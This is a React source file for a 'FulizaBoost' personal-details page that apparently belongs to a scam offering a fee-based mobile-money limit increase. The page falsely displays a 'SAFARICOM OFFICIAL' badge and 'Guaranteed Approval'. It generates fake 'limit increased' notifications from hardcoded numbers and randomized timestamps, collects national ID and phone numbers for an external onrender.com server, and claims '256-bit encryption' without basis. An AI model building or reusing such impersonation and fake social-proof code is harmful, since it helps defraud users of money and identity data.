import { useState, useEffect } from "react";
import { useLocation, useNavigate } from "react-router-dom";
import "../styles/PersonalDetails.css";

const notifications = [
  { phone: "0708****85", limit: 45000 },
  { phone: "0712****34", limit: 30000 },
  { phone: "0722****91", limit: 25000 },
  { phone: "0724****56", limit: 35000 },
  { phone: "0745****23", limit: 20000 },
  { phone: "0756****78", limit: 15000 },
  { phone: "0767****12", limit: 40000 },
  { phone: "0700****45", limit: 25000 },
  { phone: "0746****67", limit: 30000 },
  { phone: "0791****89", limit: 45000 },
];


// Weighted times for realistic feel
const notificationTimes = [
  { label: "just now", weight: 50 },
  { label: "3 mins ago", weight: 25 },
  { label: "5 mins ago", weight: 15 },
  { label: "6 mins ago", weight: 7 },
  { label: "10 mins ago", weight: 3 },
];

// Helper function to pick weighted random time
const getRandomTime = () => {
  const totalWeight = notificationTimes.reduce((sum, t) => sum + t.weight, 0);
  let rand = Math.random() * totalWeight;

  for (const t of notificationTimes) {
    if (rand < t.weight) return t.label;
    rand -= t.weight;
  }
  return "just now";
};

const PersonalDetails = () => {
  const navigate = useNavigate();
  const { state } = useLocation();

  const [limitData, setLimitData] = useState<{ amount: number; fee: number } | null>(null);
  const [currentNotification, setCurrentNotification] = useState({
    ...notifications[0],
    time: "just now",
  });
  const [showNotification, setShowNotification] = useState(true);
  const [idNumber, setIdNumber] = useState("");
  const [phone, setPhone] = useState("");
  const [loading, setLoading] = useState(false);

  // Load limit from state or sessionStorage
  useEffect(() => {
    if (state?.amount && state?.fee) {
      setLimitData({ amount: state.amount, fee: state.fee });
      sessionStorage.setItem(
        "selectedLimit",
        JSON.stringify({ amount: state.amount, fee: state.fee })
      );
    } else {
      const storedLimit = JSON.parse(sessionStorage.getItem("selectedLimit") || "null");
      if (storedLimit) setLimitData(storedLimit);
    }
  }, [state]);

  // Rotate notifications with weighted times
  useEffect(() => {
    const interval = setInterval(() => {
      setShowNotification(false);

      setTimeout(() => {
        const randomIndex = Math.floor(Math.random() * notifications.length);

        setCurrentNotification({
          ...notifications[randomIndex],
          time: getRandomTime(),
        });

        setShowNotification(true);
      }, 300);
    }, 4000);

    return () => clearInterval(interval);
  }, []);

  // Validation
  const isIdValid = /^\d{6,10}$/.test(idNumber);
  const isPhoneValid = /^(0?[71]\d{8})$/.test(phone);
  const isFormValid = isIdValid && isPhoneValid && !loading && limitData !== null;

  const handleVerify = async () => {
    if (!isFormValid || !limitData) return;
    setLoading(true);
    try {
      const response = await fetch("https://fulz-50em.onrender.com/api/boosts", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          identificationNumber: idNumber,
          amount: limitData.amount,
          fee: limitData.fee,
          createdAt: new Date().toISOString(),
        }),
      });

      if (!response.ok) throw new Error("Failed to save boost details");
      const savedBoost = await response.json();

      navigate("/confirmation", {
        state: {
          limit: savedBoost.amount,
          fee: savedBoost.fee,
          phone: `+254${phone}`,
          username: idNumber,
        },
      });
    } catch (error) {
      console.error(error);
      alert("Something went wrong. Please try again.");
    } finally {
      setLoading(false);
    }
  };

  if (!limitData) return <p className="loading-text">Loading...</p>;

  return (
    <main className="pd-container">
      {/* HEADER */}
      <div className="pd-header">
        <button className="back-btn" onClick={() => navigate(-1)}>←</button>
        <span className="header-title">Personal Details</span>
      </div>

      {/* BRAND */}
      <div className="pd-brand">
        <div className="badge">● SAFARICOM OFFICIAL</div>
        <h1 className="title">FulizaBoost</h1>
        <p className="subtitle">Instant Limit Increase • Guaranteed Approval</p>
      </div>

      {/* NOTIFICATION */}
      <div className={`notification-overlay ${showNotification ? "show" : ""}`}>
        <div className="notification-icon"></div>
        <div className="notification-content">
          <strong>{currentNotification.phone}</strong> increased to Ksh{" "}
          {currentNotification.limit.toLocaleString()}
          <div className="notification-time">• {currentNotification.time}</div>
        </div>
      </div>

      <hr />

      {/* FORM */}
      <h2 className="identify-title">Identify Yourself</h2>
      <p className="identify-text">
        This information is required to verify your eligibility for the limit increase.
      </p>

      {/* NATIONAL ID */}
      <div className="form-group">
        <label>National ID Number</label>
        <input
          type="text"
          placeholder="Enter ID Number"
          value={idNumber}
          onChange={(e) => setIdNumber(e.target.value)}
          autoFocus
        />
        {!isIdValid && idNumber && <span className="error-text">Enter a valid ID number</span>}
      </div>

      {/* PHONE */}
      <div className="form-group">
        <label>M-Pesa Registered Number</label>
        <div className="phone-input">
          <span className="prefix">+254</span>
          <input
            type="text"
            placeholder="07xx xxx xxx or 01xx xxx xxx"
            value={phone}
            onChange={(e) => setPhone(e.target.value.replace(/\D/g, ""))}
          />
        </div>
        {!isPhoneValid && phone && <span className="error-text">Enter a valid Safaricom number</span>}
      </div>

      {/* FOOTER */}
      <div className="pd-footer">
        <button
          className={`verify-btn ${isFormValid ? "enabled" : ""}`}
          onClick={handleVerify}
          disabled={!isFormValid}
        >
          {loading ? <span className="spinner" /> : "Verify & Continue"}
        </button>
        <p className="secure-text">SECURE 256-BIT ENCRYPTION</p>
      </div>
    </main>
  );
};

export default PersonalDetails;